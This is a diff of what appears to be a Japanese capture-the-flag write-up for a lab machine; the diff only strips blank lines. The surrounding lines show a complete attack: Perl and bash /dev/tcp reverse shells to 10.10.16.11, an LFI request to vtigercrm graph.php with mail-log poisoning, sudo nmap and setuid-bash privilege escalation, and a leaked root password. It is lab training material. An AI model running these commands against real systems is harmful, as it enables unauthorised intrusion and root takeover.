@@ -177,11 +177,9 @@ Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.
 listening on [any] 4444 ...
 connect to [10.10.16.11] from (UNKNOWN) [10.129.205.98] 59677
 
-
 id
 id
 uid=100(asterisk) gid=101(asterisk)
-
 
 cat /home/fanis/user.txt
 cat /home/fanis/user.txt
@@ -223,11 +221,9 @@ Welcome to Interactive Mode -- press h <enter> for help
 nmap> !bash
       !bash
 
-
 id
 id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
-
 
 cat /root/root.txt
 cat /root/root.txt
@@ -544,10 +540,8 @@ LFIで取得したパスワード`jEhdIekWmdjE`でrootのsshログイン成功�
 └─$ ssh root@10.129.205.98
 Unable to negotiate with 10.129.205.98 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
 
-
 └─$ ssh -o KexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 root@10.129.205.98
 Unable to negotiate with 10.129.205.98 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
-
 
 └─$ ssh -o KexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@10.129.205.98
 The authenticity of host '10.129.205.98 (10.129.205.98)' can't be established.
@@ -746,7 +740,6 @@ Sorry! Attempt to access restricted file.
 └─$ urlencode "bash -i >& /dev/tcp/10.10.16.11/4444 0>&1"  
 bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.11%2F4444%200%3E%261
 
-
 └─$ curl --insecure --tlsv1.0 "https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..///var/mail/asterisk%00&module=Accounts&action&cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.11%2F4444%200%3E%261"
 ```
 リバースシェル取得！
@@ -758,7 +751,6 @@ connect to [10.10.16.11] from (UNKNOWN) [10.129.205.98] 49601
 bash: no job control in this shell
 bash-3.2$ id
 uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
-
 
 bash-3.2$ sudo -l
 Matching Defaults entries for asterisk on this host:
@@ -784,12 +776,9 @@ User asterisk may run the following commands on this host:
     (root) NOPASSWD: /sbin/chkconfig
     (root) NOPASSWD: /usr/sbin/elastix-helper
 
-
 bash-3.2$ sudo chmod 4755 /bin/bash
 
-
 bash-3.2$ /bin/bash -p
-
 
 id
 uid=100(asterisk) gid=101(asterisk) euid=0(root) groups=101(asterisk)
